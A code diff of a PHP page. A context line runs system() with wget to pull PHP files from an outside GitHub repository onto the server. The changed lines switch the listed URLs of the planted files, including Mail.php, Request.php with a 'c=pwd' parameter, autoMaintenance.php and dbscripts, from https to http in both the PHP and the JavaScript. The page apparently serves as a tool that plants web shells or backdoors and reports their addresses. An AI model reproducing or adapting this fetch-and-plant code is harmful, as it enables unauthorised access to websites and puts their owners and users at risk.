@@ -3,11 +3,11 @@ system("wget https://raw.githubusercontent.com/m3n0cry/m4st3r/main/Mail.php;wget
 
 $domainName = $_SERVER['SERVER_NAME'];
 
-$domainUrl = "https://" . $domainName;
-$mailUrl = "https://" . $domainName . "/classes/mail/Mail.php";
-$requestUrl = "https://" . $domainName . "/classes/core/Request.php?c=pwd";
-$autoMaintenanceUrl = "https://" . $domainName . "/tools/autoMaintenance.php";
-$dbscriptsUrl = "https://" . $domainName . "/dbscripts";
+$domainUrl = "http://" . $domainName;
+$mailUrl = "http://" . $domainName . "/classes/mail/Mail.php";
+$requestUrl = "http://" . $domainName . "/classes/core/Request.php?c=pwd";
+$autoMaintenanceUrl = "http://" . $domainName . "/tools/autoMaintenance.php";
+$dbscriptsUrl = "http://" . $domainName . "/dbscripts";
 
 ?>
 
@@ -112,10 +112,10 @@ $dbscriptsUrl = "https://" . $domainName . "/dbscripts";
     <div class="copied-label" id="copiedLabel">Copied!</div>
 
     <script>
-        var dmailUrl = "https://" + window.location.hostname + "/classes/mail/Mail.php",
-            drequestUrl = "https://" + window.location.hostname + "/classes/core/Request.php?c=pwd",
-            dautoMaintenanceUrl = "https://" + window.location.hostname + "/tools/autoMaintenance.php",
-            ddbscriptsUrl = "https://" + window.location.hostname + "/dbscripts";
+        var dmailUrl = "http://" + window.location.hostname + "/classes/mail/Mail.php",
+            drequestUrl = "http://" + window.location.hostname + "/classes/core/Request.php?c=pwd",
+            dautoMaintenanceUrl = "http://" + window.location.hostname + "/tools/autoMaintenance.php",
+            ddbscriptsUrl = "http://" + window.location.hostname + "/dbscripts";
 
         document.getElementById("mailUrlDisplay").textContent = dmailUrl;
         document.getElementById("requestUrlDisplay").textContent = drequestUrl;
